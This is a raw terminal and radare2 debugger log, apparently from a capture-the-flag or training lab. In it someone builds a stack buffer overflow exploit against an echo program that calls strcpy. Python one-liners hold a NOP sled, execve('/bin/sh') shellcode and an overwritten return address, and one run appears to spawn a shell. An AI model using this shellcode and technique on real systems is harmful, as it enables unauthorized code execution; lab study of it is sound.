0x7fffffffe368  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x7fffffffe378  f0e3 ffff ff7f 0000 30e1 fff7 ff7f 0000  ........0.......
0x7fffffffe388  e67f def7 ff7f 0000 0000 0000 0000 0000  ................
0x7fffffffe398  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x7fffffffe3a8  5004 4000 0000 0000 d0e3 ffff ff7f 0000  P.@.............
0x7fffffffe3b8  7a04 4000 0000 0000 c8e3 ffff ff7f 0000  z.@.............
                                     /r13                               
0x7fffffffe3c8  80df fff7 ff7f 0000 0200 0000 0000 0000  ................
[0x00400563]> dr
rax = 0x000000a7
rbx = 0x00000000
rcx = 0x7ffff7b0d584
rdx = 0x7ffff7dd58c0
r8 = 0x7ffff7fef4c0
r9 = 0x00000077
r10 = 0x0000005e
r11 = 0x00000246
r12 = 0x00400450
r13 = 0x7fffffffe3d0
r14 = 0x00000000
r15 = 0x00000000
rsi = 0x00602260
rdi = 0x00000000
rsp = 0x7fffffffe2d8
rbp = 0x6c6b6a6968676665
rip = 0x00400563
rflags = 0x00000202
orax = 0xffffffffffffffff
```

```sh
./buffer-overflow `python -c "print('\x90'*110+'\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05'+'abcdefghijkl'+'\x40\xe2\xff\xff\xff\x7f')"`
```


```sh
┌──(kali㉿kali)-[~]
└─$ ssh user1@10.10.208.94            
user1@10.10.208.94's password: 
Last login: Fri Aug 16 15:15:07 2024 from ip-10-21-31-111.eu-west-1.compute.internal

       __|  __|_  )
       _|  (     /   Amazon Linux 2 AMI
      ___|\___|___|

https://aws.amazon.com/amazon-linux-2/
[user1@ip-10-10-208-94 ~]$ r2 -d ./buffer-overflow `python -c "print('\x90'*110+'\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05'+'abcdefghijklmnopqrstuvwxyz')"`
Could not execvp: No such file or directory
Could not execvp: No such file or directory
[w] Cannot open 'dbg://./buffer-overflow ��������������������������������������������������������������������������������������������������������������H�/bin/shH�H�QH�<$H1Ұ;abcdefghijklmnopqrstuvwxyz' for writing.
[user1@ip-10-10-208-94 ~]$ cdwefajwöergfk
-bash: cdwefajwöergfk: command not found
[user1@ip-10-10-208-94 ~]$ cd overflow-3
[user1@ip-10-10-208-94 overflow-3]$ r2 -d ./buffer-overflow `python -c "print('\x90'*110+'\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05'+'abcdefghijklmnopqrstuvwxyz')"`
Process with PID 19066 started...
= attach 19066 19066
bin.baddr 0x00400000
Using 0x400000
asm.bits 64
 -- Coffee time!
[0x7ffff7dd9ef0]> q
Do you want to quit? (Y/n) 
[0x7ffff7dd9ef0]> [Ay
|ERROR| Invalid command '[Ay' (0x5b)
[0x7ffff7dd9ef0]> y
No buffer yanked already
[0x7ffff7dd9ef0]> q
Do you want to quit? (Y/n) 
Do you want to kill the process? (Y/n) 
[user1@ip-10-10-208-94 overflow-3]$ 
[user1@ip-10-10-208-94 overflow-3]$ r2 -d ./buffer-overflow `python -c "print('\x90'*110+'\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05'+'abcdefghijkl'+'\x40\xe2\xff\xff\xff\x7f')"`
Process with PID 19071 started...
= attach 19071 19071
bin.baddr 0x00400000
Using 0x400000
asm.bits 64
 -- Do not try to sploit that binary - that's impossible. Instead, only try to realize the truth: there is no binary.
[0x7ffff7dd9ef0]> db
[0x7ffff7dd9ef0]> aaaa
[Cannot analyze at 0x00600ff0g with sym. and entry0 (aa)
Invalid address from 0x004005e9
[x] Analyze all flags starting with sym. and entry0 (aa)
[Warning: Invalid range. Use different search.in=? or anal.in=dbg.maps.x
Warning: Invalid range. Use different search.in=? or anal.in=dbg.maps.x
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[TOFIX: aaft can't run in debugger mode.ions (aaft)
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[Warning: Invalid range. Use different search.in=? or anal.in=dbg.maps.x
[x] Finding function preludes
[x] Enable constraint types analysis for variables
[0x7ffff7dd9ef0]> pdf @main
┌ 51: int main (int argc, char **argv, char **envp);
│           ; var int64_t var_10h @ rbp-0x10
│           ; var int64_t var_4h @ rbp-0x4
│           ; arg int argc @ rdi
│           ; arg char **argv @ rsi
│           ; DATA XREF from entry0 @ 0x40046d
│           0x00400564      55             push rbp
│           0x00400565      4889e5         mov rbp, rsp
│           0x00400568      4883ec10       sub rsp, 0x10
│           0x0040056c      897dfc         mov dword [var_4h], edi     ; argc
│           0x0040056f      488975f0       mov qword [var_10h], rsi    ; argv
│           0x00400573      bf30064000     mov edi, str.Here_s_a_program_that_echo_s_out_your_input ; 0x400630 ; "Here's a program that echo's out your input"                                                                                            
│           0x00400578      e8c3feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x0040057d      488b45f0       mov rax, qword [var_10h]
│           0x00400581      4883c008       add rax, 8
│           0x00400585      488b00         mov rax, qword [rax]
│           0x00400588      4889c7         mov rdi, rax
│           0x0040058b      e897ffffff     call sym.copy_arg
│           0x00400590      b800000000     mov eax, 0
│           0x00400595      c9             leave
└           0x00400596      c3             ret
[0x7ffff7dd9ef0]> px @main
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x00400564  5548 89e5 4883 ec10 897d fc48 8975 f0bf  UH..H....}.H.u..                                                        
0x00400574  3006 4000 e8c3 feff ff48 8b45 f048 83c0  0.@......H.E.H..
0x00400584  0848 8b00 4889 c7e8 97ff ffff b800 0000  .H..H...........
0x00400594  00c9 c366 0f1f 8400 0000 0000 4157 4156  ...f........AWAV
0x004005a4  4989 d741 5541 544c 8d25 5e08 2000 5548  I..AUATL.%^. .UH
0x004005b4  8d2d 5e08 2000 5341 89fd 4989 f64c 29e5  .-^. .SA..I..L).
0x004005c4  4883 ec08 48c1 fd03 e82f feff ff48 85ed  H...H..../...H..
0x004005d4  7420 31db 0f1f 8400 0000 0000 4c89 fa4c  t 1.........L..L
0x004005e4  89f6 4489 ef41 ff14 dc48 83c3 0148 39dd  ..D..A...H...H9.
0x004005f4  75ea 4883 c408 5b5d 415c 415d 415e 415f  u.H...[]A\A]A^A_
0x00400604  c390 662e 0f1f 8400 0000 0000 f3c3 0000  ..f.............
0x00400614  4883 ec08 4883 c408 c300 0000 0100 0200  H...H...........
0x00400624  0000 0000 0000 0000 0000 0000 4865 7265  ............Here
0x00400634  2773 2061 2070 726f 6772 616d 2074 6861  's a program tha
0x00400644  7420 6563 686f 2773 206f 7574 2079 6f75  t echo's out you
0x00400654  7220 696e 7075 7400 011b 033b 3800 0000  r input....;8...
[0x7ffff7dd9ef0]> afl
0x00400450    1 42           entry0
0x00400480    4 42   -> 37   sym.deregister_tm_clones
0x004004b0    4 58   -> 55   sym.register_tm_clones
0x004004f0    3 34   -> 29   entry.fini0
0x00400520    1 7            entry.init0
0x00400610    1 2            sym.__libc_csu_fini
0x00400527    1 61           sym.copy_arg
0x00400430    1 6            sym.imp.strcpy
0x00400440    1 6            sym.imp.puts
0x00400614    1 9            sym._fini
0x004005a0    3 101  -> 92   sym.__libc_csu_init
0x00400400    3 23           sym._init
0x00400564    1 51           main
[0x7ffff7dd9ef0]> pdf @copy_arg
Invalid address (copy_arg)
|ERROR| Invalid command 'pdf @copy_arg' (0x70)
[0x7ffff7dd9ef0]> pdf @sym.copy_arg
┌ 61: sym.copy_arg (int64_t arg1);
│           ; var int64_t var_98h @ rbp-0x98
│           ; var int64_t var_90h @ rbp-0x90
│           ; arg int64_t arg1 @ rdi
│           ; CALL XREF from main @ 0x40058b
│           0x00400527      55             push rbp
│           0x00400528      4889e5         mov rbp, rsp
│           0x0040052b      4881eca00000.  sub rsp, 0xa0
│           0x00400532      4889bd68ffff.  mov qword [var_98h], rdi    ; arg1
│           0x00400539      488b9568ffff.  mov rdx, qword [var_98h]
│           0x00400540      488d8570ffff.  lea rax, [var_90h]
│           0x00400547      4889d6         mov rsi, rdx
│           0x0040054a      4889c7         mov rdi, rax
│           0x0040054d      e8defeffff     call sym.imp.strcpy         ; char *strcpy(char *dest, const char *src)
│           0x00400552      488d8570ffff.  lea rax, [var_90h]
│           0x00400559      4889c7         mov rdi, rax
│           0x0040055c      e8dffeffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00400561      90             nop
│           0x00400562      c9             leave
└           0x00400563      c3             ret
[0x7ffff7dd9ef0]> db 0x400561
[0x7ffff7dd9ef0]> db
0x00400561 - 0x00400562 1 --x sw break enabled cmd="" cond="" name="0x400561" module="/home/user1/overflow-3/buffer-overflow"
[0x7ffff7dd9ef0]> dc
Here's a program that echo's out your input
��������������������������������������������������������������������������������������������������������������H�/bin/shH�H�QH�<$H1Ұ;abcdefghijkl@����
hit breakpoint at: 400561
[0x00400561]> ds
[0x00400561]> pxa @rsp
    - offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
                 /rsp                                                   
0x7fffffffe230  c0f8 dcf7 ff7f 0000 2ae6 ffff ff7f 0000  ........*.......
0x7fffffffe240  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe250  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe260  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe270  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe280  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe290  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe2a0  9090 9090 9090 9090 9090 9090 9090 48b9  ..............H.
0x7fffffffe2b0  2f62 696e 2f73 6811 48c1 e108 48c1 e908  /bin/sh.H...H...
0x7fffffffe2c0  5148 8d3c 2448 31d2 b03b 0f05 6162 6364  QH.<$H1..;..abcd
                 /rbp                                                   
0x7fffffffe2d0  6566 6768 696a 6b6c 40e2 ffff ff7f 0000  efghijkl@.......
0x7fffffffe2e0  d8e3 ffff ff7f 0000 0000 0000 0200 0000  ................
0x7fffffffe2f0  a005 4000 0000 0000 3ad1 a4f7 ff7f 0000  ..@.....:.......
0x7fffffffe300  0000 0000 0000 0000 d8e3 ffff ff7f 0000  ................
0x7fffffffe310  0000 0400 0200 0000 6405 4000 0000 0000  ........d.@.....
0x7fffffffe320  0000 0000 0000 0000 df1c e9a5 0e07 14a7  ................
[0x00400561]> q
Do you want to quit? (Y/n) y
Do you want to kill the process? (Y/n) 
[user1@ip-10-10-208-94 overflow-3]$ r2 -d ./buffer-overflow `python -c "print('\x90'*110+'\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05'+'abcd'+'\x40\xe2\xff\xff\xff\x7f')"`Process with PID 19091 started...
= attach 19091 19091
bin.baddr 0x00400000
Using 0x400000
asm.bits 64
 -- Can you you challenge a perfect immortal machine?
[0x7ffff7dd9ef0]> q
Do you want to quit? (Y/n) 
Do you want to kill the process? (Y/n) 
[user1@ip-10-10-208-94 overflow-3]$ ./buffer-overflow `python -c "print('\x90'*110+'\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05'+'abcd'+'\x40\xe2\xff\xff\xff\x7f')"`
Here's a program that echo's out your input
��������������������������������������������������������������������������������������������������������������H�/bin/shH�H�QH�<$H1Ұ;abcd@����
test
pwd
ls
^C
[user1@ip-10-10-208-94 overflow-3]$ r2 -d ./buffer-overflow `python -c "print('\x90'*110+'\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05'+'abcd'+'\x40\xe2\xff\xff\xff\x7f')"`
Process with PID 19104 started...
= attach 19104 19104
bin.baddr 0x00400000
Using 0x400000
asm.bits 64
 -- Violators will be prosecuted.
[0x7ffff7dd9ef0]> aaaa
[Cannot analyze at 0x00600ff0g with sym. and entry0 (aa)
Invalid address from 0x004005e9
[x] Analyze all flags starting with sym. and entry0 (aa)
[Warning: Invalid range. Use different search.in=? or anal.in=dbg.maps.x
Warning: Invalid range. Use different search.in=? or anal.in=dbg.maps.x
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[TOFIX: aaft can't run in debugger mode.ions (aaft)
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[Warning: Invalid range. Use different search.in=? or anal.in=dbg.maps.x
[x] Finding function preludes
[x] Enable constraint types analysis for variables
[0x7ffff7dd9ef0]> db 0x400561
[0x7ffff7dd9ef0]> db
0x00400561 - 0x00400562 1 --x sw break enabled cmd="" cond="" name="0x400561" module="/home/user1/overflow-3/buffer-overflow"
[0x7ffff7dd9ef0]> dc
Here's a program that echo's out your input
��������������������������������������������������������������������������������������������������������������H�/bin/shH�H�QH�<$H1Ұ;abcd@����
hit breakpoint at: 400561
[0x00400561]> pxa @rsp
    - offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
                 /rsp                                                   
0x7fffffffe240  c0f8 dcf7 ff7f 0000 32e6 ffff ff7f 0000  ........2.......
0x7fffffffe250  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe260  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe270  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe280  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe290  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe2a0  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe2b0  9090 9090 9090 9090 9090 9090 9090 48b9  ..............H.
0x7fffffffe2c0  2f62 696e 2f73 6811 48c1 e108 48c1 e908  /bin/sh.H...H...
0x7fffffffe2d0  5148 8d3c 2448 31d2 b03b 0f05 6162 6364  QH.<$H1..;..abcd
                 /rbp                                                   
0x7fffffffe2e0  40e2 ffff ff7f 0000 9005 4000 0000 0000  @.........@.....
0x7fffffffe2f0  e8e3 ffff ff7f 0000 0000 0000 0200 0000  ................
0x7fffffffe300  a005 4000 0000 0000 3ad1 a4f7 ff7f 0000  ..@.....:.......
0x7fffffffe310  0000 0000 0000 0000 e8e3 ffff ff7f 0000  ................
0x7fffffffe320  0000 0400 0200 0000 6405 4000 0000 0000  ........d.@.....
0x7fffffffe330  0000 0000 0000 0000 d638 583b 0c0a b7f1  .........8X;....
[0x00400561]> dr
rax = 0x00000097
rbx = 0x00000000
rcx = 0x7ffff7b0d584
rdx = 0x7ffff7dd58c0
r8 = 0x7ffff7fef4c0
r9 = 0x00000077
r10 = 0x0000005e
r11 = 0x00000246
r12 = 0x00400450
r13 = 0x7fffffffe3e0
r14 = 0x00000000
r15 = 0x00000000
rsi = 0x00602260
rdi = 0x00000000
rsp = 0x7fffffffe240
rbp = 0x7fffffffe2e0
rip = 0x00400561
rflags = 0x00000206
orax = 0xffffffffffffffff
[0x00400561]> q
Do you want to quit? (Y/n) 
Do you want to kill the process? (Y/n) 
[user1@ip-10-10-208-94 overflow-3]$ ./buffer-overflow `python -c "print('\x90'*110+'\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05'+'abcd'+'\x80\xe2\xff\xff\xff\x7f')"`
Here's a program that echo's out your input
��������������������������������������������������������������������������������������������������������������H�/bin/shH�H�QH�<$H1Ұ;abcd�����
Illegal instruction
[user1@ip-10-10-208-94 overflow-3]$ r2 -d ./buffer-overflow `python -c "print('\x90'*110+'\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05'+'abcd'+'\x80\xe2\xff\xff\xff\x7f')"`
Process with PID 19157 started...
= attach 19157 19157
bin.baddr 0x00400000
Using 0x400000
asm.bits 64
 -- Come to C me!
[0x7ffff7dd9ef0]> aaaa
[Cannot analyze at 0x00600ff0g with sym. and entry0 (aa)
Invalid address from 0x004005e9
[x] Analyze all flags starting with sym. and entry0 (aa)
[Warning: Invalid range. Use different search.in=? or anal.in=dbg.maps.x
Warning: Invalid range. Use different search.in=? or anal.in=dbg.maps.x
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[TOFIX: aaft can't run in debugger mode.ions (aaft)
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[Warning: Invalid range. Use different search.in=? or anal.in=dbg.maps.x
[x] Finding function preludes
[x] Enable constraint types analysis for variables
[0x7ffff7dd9ef0]> db 0x400561
[0x7ffff7dd9ef0]> db
0x00400561 - 0x00400562 1 --x sw break enabled cmd="" cond="" name="0x400561" module="/home/user1/overflow-3/buffer-overflow"
[0x7ffff7dd9ef0]> dc
Here's a program that echo's out your input
��������������������������������������������������������������������������������������������������������������H�/bin/shH�H�QH�<$H1Ұ;abcd�����
hit breakpoint at: 400561
[0x00400561]> pxa @rsp
    - offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
                 /rsp                                                   
0x7fffffffe240  c0f8 dcf7 ff7f 0000 32e6 ffff ff7f 0000  ........2.......
0x7fffffffe250  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe260  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe270  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe280  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe290  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe2a0  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe2b0  9090 9090 9090 9090 9090 9090 9090 48b9  ..............H.
0x7fffffffe2c0  2f62 696e 2f73 6811 48c1 e108 48c1 e908  /bin/sh.H...H...
0x7fffffffe2d0  5148 8d3c 2448 31d2 b03b 0f05 6162 6364  QH.<$H1..;..abcd
                 /rbp                                                   
0x7fffffffe2e0  80e2 ffff ff7f 0000 9005 4000 0000 0000  ..........@.....
0x7fffffffe2f0  e8e3 ffff ff7f 0000 0000 0000 0200 0000  ................
0x7fffffffe300  a005 4000 0000 0000 3ad1 a4f7 ff7f 0000  ..@.....:.......
0x7fffffffe310  0000 0000 0000 0000 e8e3 ffff ff7f 0000  ................
0x7fffffffe320  0000 0400 0200 0000 6405 4000 0000 0000  ........d.@.....
0x7fffffffe330  0000 0000 0000 0000 9723 00cf dd73 c1b3  .........#...s..
[0x00400561]> dr
rax = 0x00000097
rbx = 0x00000000
rcx = 0x7ffff7b0d584
rdx = 0x7ffff7dd58c0
r8 = 0x7ffff7fef4c0
r9 = 0x00000077
r10 = 0x0000005e
r11 = 0x00000246
r12 = 0x00400450
r13 = 0x7fffffffe3e0
r14 = 0x00000000
r15 = 0x00000000
rsi = 0x00602260
rdi = 0x00000000
rsp = 0x7fffffffe240
rbp = 0x7fffffffe2e0
rip = 0x00400561
rflags = 0x00000206
orax = 0xffffffffffffffff
[0x00400561]> ds
[0x00400561]> pxa @rsp
    - offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
                 /rsp                                                   
0x7fffffffe240  c0f8 dcf7 ff7f 0000 32e6 ffff ff7f 0000  ........2.......
0x7fffffffe250  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe260  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe270  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe280  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe290  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe2a0  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe2b0  9090 9090 9090 9090 9090 9090 9090 48b9  ..............H.
0x7fffffffe2c0  2f62 696e 2f73 6811 48c1 e108 48c1 e908  /bin/sh.H...H...
0x7fffffffe2d0  5148 8d3c 2448 31d2 b03b 0f05 6162 6364  QH.<$H1..;..abcd
                 /rbp                                                   
0x7fffffffe2e0  80e2 ffff ff7f 0000 9005 4000 0000 0000  ..........@.....
0x7fffffffe2f0  e8e3 ffff ff7f 0000 0000 0000 0200 0000  ................
0x7fffffffe300  a005 4000 0000 0000 3ad1 a4f7 ff7f 0000  ..@.....:.......
0x7fffffffe310  0000 0000 0000 0000 e8e3 ffff ff7f 0000  ................
0x7fffffffe320  0000 0400 0200 0000 6405 4000 0000 0000  ........d.@.....
0x7fffffffe330  0000 0000 0000 0000 9723 00cf dd73 c1b3  .........#...s..
[0x00400561]> dr
rax = 0x00000097
rbx = 0x00000000
rcx = 0x7ffff7b0d584
rdx = 0x7ffff7dd58c0
r8 = 0x7ffff7fef4c0
r9 = 0x00000077
r10 = 0x0000005e
r11 = 0x00000246
r12 = 0x00400450
r13 = 0x7fffffffe3e0
r14 = 0x00000000
r15 = 0x00000000
rsi = 0x00602260
rdi = 0x00000000
rsp = 0x7fffffffe240
rbp = 0x7fffffffe2e0
rip = 0x00400562
rflags = 0x00000206
orax = 0xffffffffffffffff
[0x00400561]> ds
[0x00400561]> pxa @rsp
    - offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
                 /rsp                                                   
0x7fffffffe2e8  9005 4000 0000 0000 e8e3 ffff ff7f 0000  ..@.............
0x7fffffffe2f8  0000 0000 0200 0000 a005 4000 0000 0000  ..........@.....
0x7fffffffe308  3ad1 a4f7 ff7f 0000 0000 0000 0000 0000  :...............
0x7fffffffe318  e8e3 ffff ff7f 0000 0000 0400 0200 0000  ................
0x7fffffffe328  6405 4000 0000 0000 0000 0000 0000 0000  d.@.............
0x7fffffffe338  9723 00cf dd73 c1b3 5004 4000 0000 0000  .#...s..P.@.....
0x7fffffffe348  e0e3 ffff ff7f 0000 0000 0000 0000 0000  ................
0x7fffffffe358  0000 0000 0000 0000 9723 6002 a28c 3e4c  .........#`...>L
0x7fffffffe368  9723 a465 149c 3e4c 0000 0000 0000 0000  .#.e..>L........
0x7fffffffe378  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x7fffffffe388  00e4 ffff ff7f 0000 30e1 fff7 ff7f 0000  ........0.......
0x7fffffffe398  e67f def7 ff7f 0000 0000 0000 0000 0000  ................
0x7fffffffe3a8  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x7fffffffe3b8  5004 4000 0000 0000 e0e3 ffff ff7f 0000  P.@.............
0x7fffffffe3c8  7a04 4000 0000 0000 d8e3 ffff ff7f 0000  z.@.............
                                     /r13                               
0x7fffffffe3d8  80df fff7 ff7f 0000 0200 0000 0000 0000  ................
[0x00400561]> dr
rax = 0x00000097
rbx = 0x00000000
rcx = 0x7ffff7b0d584
rdx = 0x7ffff7dd58c0
r8 = 0x7ffff7fef4c0
r9 = 0x00000077
r10 = 0x0000005e
r11 = 0x00000246
r12 = 0x00400450
r13 = 0x7fffffffe3e0
r14 = 0x00000000
r15 = 0x00000000
rsi = 0x00602260
rdi = 0x00000000
rsp = 0x7fffffffe2e8
rbp = 0x7fffffffe280
rip = 0x00400563
rflags = 0x00000206
orax = 0xffffffffffffffff
[0x00400561]> pxa 0x7fffffffe280
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x003fe7e1  ffff ffff ffff ffff ffff ffff ffff ffff  ................
0x003fe7f1  ffff ffff ffff ffff ffff ffff ffff ffff  ................
0x003fe801  ffff ffff ffff ffff ffff ffff ffff ffff  ................
0x003fe811  ffff ffff ffff ffff ffff ffff ffff ffff  ................
0x003fe821  ffff ffff ffff ffff ffff ffff ffff ffff  ................
0x003fe831  ffff ffff ffff ffff ffff ffff ffff ffff  ................
0x003fe841  ffff ffff ffff ffff ffff ffff ffff ffff  ................
0x003fe851  ffff ffff ffff ffff ffff ffff ffff ffff  ................
0x003fe861  ffff ffff ffff ffff ffff ffff ffff ffff  ................
0x003fe871  ffff ffff ffff ffff ffff ffff ffff ffff  ................
0x003fe881  ffff ffff ffff ffff ffff ffff ffff ffff  ................
0x003fe891  ffff ffff ffff ffff ffff ffff ffff ffff  ................
0x003fe8a1  ffff ffff ffff ffff ffff ffff ffff ffff  ................
0x003fe8b1  ffff ffff ffff ffff ffff ffff ffff ffff  ................
0x003fe8c1  ffff ffff ffff ffff ffff ffff ffff ffff  ................
0x003fe8d1  ffff ffff ffff ffff ffff ffff ffff ffff  ................
[0x00400561]> pxa @0x7fffffffe280
    - offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
                 /rbp                                                   
0x7fffffffe280  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe290  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe2a0  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe2b0  9090 9090 9090 9090 9090 9090 9090 48b9  ..............H.
0x7fffffffe2c0  2f62 696e 2f73 6811 48c1 e108 48c1 e908  /bin/sh.H...H...
0x7fffffffe2d0  5148 8d3c 2448 31d2 b03b 0f05 6162 6364  QH.<$H1..;..abcd
                                     /rsp                               
0x7fffffffe2e0  80e2 ffff ff7f 0000 9005 4000 0000 0000  ..........@.....
0x7fffffffe2f0  e8e3 ffff ff7f 0000 0000 0000 0200 0000  ................
0x7fffffffe300  a005 4000 0000 0000 3ad1 a4f7 ff7f 0000  ..@.....:.......
0x7fffffffe310  0000 0000 0000 0000 e8e3 ffff ff7f 0000  ................
0x7fffffffe320  0000 0400 0200 0000 6405 4000 0000 0000  ........d.@.....
0x7fffffffe330  0000 0000 0000 0000 9723 00cf dd73 c1b3  .........#...s..
0x7fffffffe340  5004 4000 0000 0000 e0e3 ffff ff7f 0000  P.@.............
0x7fffffffe350  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x7fffffffe360  9723 6002 a28c 3e4c 9723 a465 149c 3e4c  .#`...>L.#.e..>L
0x7fffffffe370  0000 0000 0000 0000 0000 0000 0000 0000  ................
[0x00400561]> q
Do you want to quit? (Y/n) 
Do you want to kill the process? (Y/n) 
[user1@ip-10-10-208-94 overflow-3]$ r2 -d ./buffer-overflow `python -c "print('\x90'*110+'\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05'+'abcd'+'\x80\xe2\xff\xff\xff\x7f')"`
Process with PID 19171 started...
= attach 19171 19171
bin.baddr 0x00400000
Using 0x400000
asm.bits 64
 -- Buy a Mac
[0x7ffff7dd9ef0]> aaaa
[Cannot analyze at 0x00600ff0g with sym. and entry0 (aa)
Invalid address from 0x004005e9
[x] Analyze all flags starting with sym. and entry0 (aa)
[Warning: Invalid range. Use different search.in=? or anal.in=dbg.maps.x
Warning: Invalid range. Use different search.in=? or anal.in=dbg.maps.x
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[TOFIX: aaft can't run in debugger mode.ions (aaft)
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[Warning: Invalid range. Use different search.in=? or anal.in=dbg.maps.x
[x] Finding function preludes
[x] Enable constraint types analysis for variables
[0x7ffff7dd9ef0]> ds
[0x7ffff7dd9ef0]> dc
Here's a program that echo's out your input
��������������������������������������������������������������������������������������������������������������H�/bin/shH�H�QH�<$H1Ұ;abcd�����
child stopped with signal 11
[+] SIGNAL 11 errno=0 addr=0x00000000 code=128 ret=0
[0x00400596]> dc
child stopped with signal 11
[+] SIGNAL 11 errno=0 addr=0x00000000 code=128 ret=0
[0x00400596]> dr
rax = 0x00000000
rbx = 0x00000000
rcx = 0x7ffff7b0d584
rdx = 0x7ffff7dd58c0
r8 = 0x7ffff7fef4c0
r9 = 0x00000077
r10 = 0x0000005e
r11 = 0x00000246
r12 = 0x00400450
r13 = 0x7fffffffe3e0
r14 = 0x00000000
r15 = 0x00000000
rsi = 0x00602260
rdi = 0x00000000
rsp = 0x7fffffffe288
rbp = 0x9090909090909090
rip = 0x00400596
rflags = 0x00010206
orax = 0xffffffffffffffff
[0x00400596]> Connection to 10.10.208.94 closed by remote host.
Connection to 10.10.208.94 closed.

```